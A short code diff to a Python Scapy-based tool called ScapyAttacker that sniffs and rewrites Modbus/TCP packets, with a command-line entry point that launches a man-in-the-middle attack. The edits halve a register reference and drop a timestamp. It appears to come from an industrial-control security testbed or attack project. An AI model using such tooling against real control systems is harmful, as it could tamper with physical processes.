@@ -113,10 +113,10 @@ class ScapyAttacker:
                 pkt['IP'].dst,
                 pkt['TCP'].dport,
                 modbus_packet.Command,
-                modbus_packet.Reference,
+                int(modbus_packet.Reference) /2,    # 2 in the work_num
                 value,
                 value,
-                datetime.now().timestamp()
+
             )
 
             ScapyAttacker.sniff_commands.append(command)
@@ -133,6 +133,8 @@ class ScapyAttacker:
 
         new_packet = IP(dst=pkt['IP'].dst, src=pkt['IP'].src)
         new_packet['IP'].payload = pkt['IP'].payload
+
+
 
         if new_packet.haslayer('TCP') and len(new_packet['TCP'].payload) > 0:
             tcp_packet = ModbusTCP(pkt['TCP'].payload.load)
@@ -313,3 +315,5 @@ if __name__ == '__main__':
 
     if args.attack == 'mitm':
         ScapyAttacker.mitm_attack(args.mode, args.destination, args.timeout,  args.parameter, logger)
+
+
